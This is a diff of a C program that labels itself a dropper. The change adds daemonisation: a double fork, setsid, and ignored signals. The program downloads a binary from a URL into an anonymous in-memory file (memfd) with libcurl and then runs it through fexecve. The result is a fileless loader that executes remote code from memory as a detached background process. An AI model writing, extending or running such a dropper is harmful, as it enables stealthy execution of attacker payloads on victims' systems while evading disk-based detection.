@@ -1,13 +1,13 @@
-/*Golang being annoying with syscalls. Working around issue in C*/
+/* Implementation of Dropper in C */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>  
-#include <string.h>     
-#include <sys/socket.h>
-#include <arpa/inet.h> 
+#include <string.h> 
+#include <signal.h>
 #include <sys/mman.h>
 #include <curl/curl.h>
+#include <sys/stat.h>
 
 int create_memfd(char* fd_name){
     int fd;
@@ -22,7 +22,7 @@ int create_memfd(char* fd_name){
 }
 
 
-void write_file(char* url, long port, char* filepath) {
+void write_file(char* url, char* filepath) {
     CURL *curl;
     FILE *fp;
     CURLcode res;
@@ -54,15 +54,41 @@ void write_file(char* url, long port, char* filepath) {
 }
 
 
-void exec_fd(int fd, char* evp[]){
+void exec_fd(int fd, char* argv[], char* evp[]){
     printf("[+] Executing file\n");
+
+    /* First Fork */
     pid_t pid = fork();
-    if(pid == 0){
-        char fname[128];
-        int j = snprintf(fname, 128, "/proc/self/fd/%d", fd);
-        char* p_argv[] = {fname, NULL};
-        fexecve(fd, p_argv, evp);
-    }
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* The child process becomes session leader */
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    /* Catch, ignore and handle signals */
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    /* Fork off for the second time*/
+    pid = fork();
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* Set new file permissions */
+    umask(0);
+    chdir("/");
+    
+    /* Execute File in Daemon Process */
+    char fname[128];
+    int j = snprintf(fname, 128, "/proc/self/fd/%d", fd);
+    char* p_argv[] = {fname, NULL};
+    fexecve(fd, p_argv, evp);
+
     return;
 }
 
@@ -85,7 +111,7 @@ int main(int argc, char *argv[], char * envp[]){
     /* Run Dropper */
     fd_num = create_memfd(fd_name);
     int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
-    write_file(url, 8000, fd_path);
-    exec_fd(fd_num, envp);
+    write_file(url, fd_path);
+    exec_fd(fd_num, argv, envp);
     return 0;
 }
